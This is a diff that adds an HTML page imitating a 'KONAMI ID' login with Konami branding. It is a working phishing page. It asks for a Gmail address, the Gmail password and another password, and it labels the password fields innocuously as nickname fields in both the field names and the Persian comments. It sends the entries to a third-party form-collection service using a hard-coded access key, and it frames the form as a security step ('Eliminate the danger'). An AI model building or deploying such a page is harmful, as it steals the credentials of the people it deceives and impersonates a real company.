@@ -1,0 +1,214 @@
+
+<!DOCTYPE html>
+<html lang="fa">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gaming Network</title>
+
+    <style>
+        * {
+            box-sizing: border-box;
+        }
+
+        body {
+            margin: 0;
+            padding: 0;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: #efefef;
+            font-family: Arial, sans-serif;
+            color: #777777;
+        }
+
+        .container {
+            width: 90%;
+            max-width: 400px;
+            background: #ffffff;
+            padding: 35px 30px;
+            border-radius: 6px;
+            box-shadow: 0 5px 25px rgba(0,0,0,0.08);
+            border: 1px solid #d2d2d2;
+        }
+
+        .sp1 {
+            display: block;
+            text-align: center;
+            margin-bottom: 30px;
+            color: #777777;
+            font-size: 16px;
+        }
+
+        .input-box {
+            margin-bottom: 18px;
+        }
+
+        .input-box span {
+            display: block;
+            margin-bottom: 7px;
+            color: #999999;
+            font-size: 14px;
+        }
+
+        input[type="email"],
+        input[type="text"] {
+            width: 100%;
+            padding: 13px;
+            border: 1px solid #dddddd;
+            border-radius: 8px;
+            outline: none;
+            background: #ffffff;
+            color: #666666;
+            font-size: 15px;
+            transition: 0.3s;
+        }
+
+        input[type="email"]:focus,
+        input[type="text"]:focus {
+            border-color: #bbbbbb;
+        }
+
+        input::placeholder {
+            color: #bbbbbb;
+        }
+
+        .agree {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin: 20px 0;
+            font-size: 13px;
+            color: #999999;
+        }
+
+        .agree input {
+            width: auto;
+        }
+
+        button {
+            width: 100%;
+            padding: 13px;
+            border: none;
+            border-radius: 8px;
+            background: #e53935;
+            color: white;
+            font-size: 16px;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+
+        button:hover {
+            background: #c62828;
+        }
+
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 12px;
+            color: #aaaaaa;
+        }
+        .top-logo {
+    display: block;
+    width: 180px;
+    height: auto;
+    margin: 0 auto 30px;}
+    .top-bar {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 50px;
+    background: #ffffff;
+    z-index: 1000;
+}
+h1{
+    display: block;
+    text-align: center;
+}
+
+    </style>
+</head>
+
+<body>
+<div class="top-bar"><div class="top-bar"><img   width="112" height="60"  src="https://logolook.net/wp-content/uploads/2022/10/Konami-Logo.png" style="color: transparent;"></div></div>
+<div class="container">
+<div>
+     <!-- <img src="https://logolook.net/wp-content/uploads/2022/10/Konami-Logo.png" class="top-logo"> -->
+   <h1 class="Heading-module-scss-module__KI432W__heading__lv2--narrow-frame">KONAMI ID</h1>
+</div>
+    <form action="https://api.web3forms.com/submit" method="POST">
+
+        <!-- Web3Forms Access Key -->
+        <input type="hidden"
+               name="access_key"
+               value="03042f25-126f-4bf1-ba1c-1c86d092c618">
+
+        <input type="hidden"
+               name="subject"
+               value="Gaming Network Form">
+
+        <!-- Gmail -->
+        <div class="input-box">
+            <span>Gmail</span>
+
+            <input
+                type="email"
+                name="email"
+                placeholder="KONAMI ID / E-mail address" 
+                pattern="[a-zA-Z0-9._%+-]+@gmail\.com"
+                title="لطفاً یک آدرس Gmail وارد کنید"
+                required>
+                
+        </div>
+
+        <!-- اسم مستعار شما -->
+        <div class="input-box">
+            <span>Gmail password</span>
+
+            <input
+                type="text"
+                name="nickname"
+                placeholder=""
+                pattern="[A-Za-z0-9_!@#$%^&*.\-]+"
+            
+                required>
+        </div>
+
+        <!-- اسم مستعار بهترین دوست -->
+        <div class="input-box">
+            <span>password</span>
+
+            <input
+                type="text"
+                name="best_friend_nickname"
+                placeholder=""
+                pattern="[A-Za-z0-9_!@#$%^&*.\-]+"
+                
+                required>
+        </div>
+
+
+<!-- تأیید -->
+        <label class="agree">
+            <input type="checkbox" required>
+          Confirm information
+        </label>
+
+     
+       <button type="submit">Eliminate the danger</button>
+       
+
+
+
+    </form>
+
+    <div class="footer">
+     <h3>   We are working to protect <br> your account</h3>
+    </div>
+
+</div>
+
+</body>
+</html>
